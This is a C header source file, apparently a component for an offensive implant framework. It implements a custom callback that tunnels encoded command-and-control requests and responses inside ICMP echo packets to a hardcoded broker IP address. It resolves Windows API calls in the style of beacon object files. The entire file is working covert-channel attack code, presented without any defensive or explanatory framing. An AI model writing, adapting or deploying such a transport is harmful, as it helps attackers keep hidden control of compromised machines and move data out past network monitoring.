#pragma once

#include <winsock2.h>
#include <windows.h>
#include <iphlpapi.h>
#include <string.h>

#ifndef KERNEL32$GetProcessHeap
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap();
#endif
#ifndef KERNEL32$HeapAlloc
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
#endif
#ifndef KERNEL32$HeapFree
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
#endif
#ifndef KERNEL32$CloseHandle
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
#endif
#ifndef MSVCRT$printf
DECLSPEC_IMPORT int MSVCRT$printf(const char *format, ...);
#endif
#ifndef MSVCRT$strlen
DECLSPEC_IMPORT size_t MSVCRT$strlen(const char *str);
#endif
#ifndef IPHLPAPI$IcmpCreateFile
DECLSPEC_IMPORT HANDLE WINAPI IPHLPAPI$IcmpCreateFile();
#endif
#ifndef IPHLPAPI$IcmpSendEcho
DECLSPEC_IMPORT DWORD WINAPI IPHLPAPI$IcmpSendEcho(HANDLE, IPAddr, LPVOID, WORD, PIP_OPTION_INFORMATION, LPVOID, DWORD, DWORD);
#endif
#ifndef IPHLPAPI$IcmpCloseHandle
DECLSPEC_IMPORT BOOL WINAPI IPHLPAPI$IcmpCloseHandle(HANDLE);
#endif
#ifndef WS2_32$inet_addr
DECLSPEC_IMPORT unsigned long WSAAPI WS2_32$inet_addr(const char *cp);
#endif

#define BROKER_IP          "192.168.208.137"
#define ICMP_TIMEOUT_MS    5000
#define ICMP_REPLY_BUFSIZE 65535

static char *customCallback(const char *encodedRequest, const char *host, INTERNET_PORT port)
{
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    DWORD reqLen = encodedRequest ? (DWORD)MSVCRT$strlen(encodedRequest) : 0;
    HANDLE icmpHandle = NULL;
    char *sendBuffer = NULL;
    char *responseBuf = NULL;
    char *replyBuffer = NULL;
    MSVCRT$printf("[customCallback] received request for %s:%u\n", host ? host : "", (unsigned int)port);

    if (encodedRequest == NULL || reqLen == 0) {
        MSVCRT$printf("[customCallback] no request data to send\n");
        return NULL;
    }

    icmpHandle = IPHLPAPI$IcmpCreateFile();
    if (icmpHandle == INVALID_HANDLE_VALUE) {
        MSVCRT$printf("[customCallback] IcmpCreateFile failed\n");
        return NULL;
    }

    DWORD packetLen = sizeof(DWORD) + reqLen;
    sendBuffer = (char *)KERNEL32$HeapAlloc(hHeap, 0, packetLen);
    if (sendBuffer == NULL) {
        MSVCRT$printf("[customCallback] allocation failed for request buffer\n");
        goto cleanup;
    }

    memcpy(sendBuffer, &reqLen, sizeof(DWORD));
    memcpy(sendBuffer + sizeof(DWORD), encodedRequest, reqLen);

    DWORD replySize = ICMP_REPLY_BUFSIZE;
    replyBuffer = (char *)KERNEL32$HeapAlloc(hHeap, 0, replySize);
    if (replyBuffer == NULL) {
        MSVCRT$printf("[customCallback] allocation failed for reply buffer\n");
        goto cleanup;
    }

    DWORD destIp = WS2_32$inet_addr(BROKER_IP);
    DWORD result = IPHLPAPI$IcmpSendEcho(
        icmpHandle,
        destIp,
        sendBuffer,
        (WORD)packetLen,
        NULL,
        replyBuffer,
        replySize,
        ICMP_TIMEOUT_MS
    );

    if (result == 0) {
        MSVCRT$printf("[customCallback] IcmpSendEcho failed\n");
        goto cleanup;
    }

    PICMP_ECHO_REPLY pReply = (PICMP_ECHO_REPLY)replyBuffer;
    if (pReply->Status != IP_SUCCESS) {
        MSVCRT$printf("[customCallback] ICMP reply returned status 0x%08lx\n", (unsigned long)pReply->Status);
        goto cleanup;
    }

    if (pReply->DataSize < sizeof(DWORD)) {
        MSVCRT$printf("[customCallback] ICMP reply too small for length field\n");
        goto cleanup;
    }

    DWORD responseLen = 0;
    memcpy(&responseLen, pReply->Data, sizeof(DWORD));

    if (responseLen == 0 || responseLen > (pReply->DataSize - sizeof(DWORD))) {
        MSVCRT$printf("[customCallback] invalid response length %lu from ICMP reply\n", (unsigned long)responseLen);
        goto cleanup;
    }

    responseBuf = (char *)KERNEL32$HeapAlloc(hHeap, 0, responseLen + 1);
    if (responseBuf == NULL) {
        MSVCRT$printf("[customCallback] allocation failed for response buffer\n");
        goto cleanup;
    }

    memcpy(responseBuf, (char *)pReply->Data + sizeof(DWORD), responseLen);
    responseBuf[responseLen] = '\0';

    MSVCRT$printf("[customCallback] received %lu bytes over ICMP\n", (unsigned long)responseLen);

cleanup:
    if (sendBuffer != NULL) {
        KERNEL32$HeapFree(hHeap, 0, sendBuffer);
    }
    if (replyBuffer != NULL) {
        KERNEL32$HeapFree(hHeap, 0, replyBuffer);
    }
    if (icmpHandle != NULL && icmpHandle != INVALID_HANDLE_VALUE) {
        IPHLPAPI$IcmpCloseHandle(icmpHandle);
    }

    return responseBuf;
}
